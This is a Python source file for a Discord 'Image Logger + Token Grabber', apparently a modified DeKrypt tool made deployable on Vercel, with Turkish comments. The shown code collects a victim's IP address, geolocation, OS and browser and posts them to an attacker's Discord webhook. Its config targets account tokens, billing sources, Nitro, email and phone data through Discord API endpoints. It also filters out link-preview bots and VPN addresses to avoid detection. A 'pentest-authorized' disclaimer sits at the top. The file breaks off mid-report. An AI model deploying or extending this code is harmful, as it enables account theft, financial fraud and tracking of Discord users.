# Discord Image Logger + Token Grabber - Vercel Uyumlu
# By DeKrypt (Modified) | Pentest-Authorized Use Only

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger + Token Grabber"
__description__ = "Image Logger with Token Grabbing capability via Discord Open Original"
__version__ = "v2.0-tg"
__author__ = "DeKrypt + Modified"

config = {
    "webhook": "https://discord.com/api/webhooks/...",  # WEBHOOK URL'INI BURAYA YAZ
    "image": "https://ornek.com/resim.jpg",  # GÖSTERİLECEK RESMİN URL'İ
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
    "grabTokens": True,
    "grabNitro": True,
    "grabBilling": True,
    "grabEmail": True,
    "grabPhone": True,
    "grabBackupCodes": False,
    "discordApi": "https://discord.com/api/v9/users/@me",
    "billingApi": "https://discord.com/api/v9/users/@me/billing/payment-sources",
    "nitroApi": "https://discord.com/api/v9/users/@me/subscriptions",
    "backupCodesApi": "https://discord.com/api/v9/users/@me/mfa/codes",
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Token Grabber - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, tokens=None):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        try:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Token Grabber - Link Sent",
                    "color": config["color"],
                    "description": f"Token Grabber link sent in chat!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        except:
            pass
        return

    ping = "@everyone"
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
    except:
        info = {"isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown", 
                "city": "Unknown", "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", 
                "mobile": False, "proxy": False, "hosting": False}
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name = "Unknown"
    browser = "Unknown"
    if useragent:
        try:
            os_name, browser = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Token Grabber - IP + Token Captured",
            "color": config["color"],
            "description": f"""**User Opened the Original Image!**
            
**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', '0'))+', '+str(info.get('lon', '0')) if not coords else coords.replace(',', ', ')}`
> **Timezone:** `{str(info.get('timezone', 'Unknown/Unknown')).split('/')[1].replace('_', ' ') if '/' in str(info.get('timezone', '')) else 'Unknown'}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`
**User Agent:**
